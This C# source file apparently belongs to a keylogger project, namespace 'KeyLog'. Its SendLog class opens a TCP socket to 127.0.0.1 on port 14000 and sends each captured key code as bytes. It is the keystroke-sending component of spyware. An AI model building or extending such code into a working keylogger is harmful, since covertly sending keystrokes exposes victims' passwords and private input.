using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLog
{
    class SendLog
    {
        public SendLog(int Key)
        {
            Socket Sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            
            try
            {
                Sender.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 14000));

                byte[] Data = BitConverter.GetBytes(Key);
                Sender.Send(Data);
            }
            catch(Exception Ex)
            {
                Console.WriteLine(Ex.StackTrace);
            }
            Sender.Close();
        }
    }
}
